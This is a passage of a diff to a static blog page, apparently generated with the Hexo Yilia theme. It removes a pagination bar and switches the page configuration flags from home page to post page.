-                <i class="icon-font icon-plane jump-plane"></i>
-            </div>
-        </div>
-        
-        
-    </div>
-</aside>
-
-
-
-
   
   
-    <nav id="page-nav">
-      <a class="extend prev" rel="prev" href="/page/2/">&laquo; Prev</a><a class="page-number" href="/">1</a><a class="page-number" href="/page/2/">2</a><span class="page-number current">3</span>
-    </nav>
+  
+
+  
+
+  
+
   
 
 
@@ -345,8 +349,8 @@
     <script>
 	var yiliaConfig = {
 		mathjax: false,
-		isHome: true,
-		isPost: false,
+		isHome: false,
+		isPost: true,
 		isArchive: false,
 		isTag: false,
 		isCategory: false,
